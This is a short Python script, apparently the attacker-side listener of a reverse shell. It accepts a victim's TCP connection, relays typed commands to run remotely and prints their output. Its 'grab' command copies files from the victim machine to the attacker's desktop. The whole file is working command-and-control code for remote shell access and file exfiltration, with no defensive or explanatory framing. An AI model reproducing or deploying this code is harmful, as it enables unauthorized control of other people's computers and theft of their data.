import socket
import os


def transfer(connection, command):
    connection.send(command.encode())
    grab, path = command.split("•")
    # Opens a file on your desktop to receive the data.
    f = open("root/Desktop"+path, "wb")
    while True:
        data = connection.recv(1024)
        # If you get to here, you are at the end of the file. 
        if data.endswith("DONE".encode()):
            # Writes the last kb without the 'DONE' string.
            f.write(data[:-4])
            f.close()
            print("[+] Transfer complete!")
            break
        if "File not found".encode() in data:
            print("[-] Unable to find the file!")
            break
        f.write(data)

def connect():
    s = socket.socket()
    s.bind(("192.168.25.56", 8080))    
    s.listen(1)
    print("[+] Listening for incoming TCP connections...")
    connection, address = s.accept()    
    print("[+] Connection established from: ", address)
    
    while True:
        command = input("Shell> ")
        if "q" in command:
            connection.send("q".encode())
            connection.close()
            break
        elif command == "":
            pass
        # Grab signifies that we would like to send a file through the channel
        elif "grab" in command:
            transfer(connection, command)
        else:
            connection.send(command.encode())
            print(connection.recv(1024).decode())

def main():
    connect()
    

main()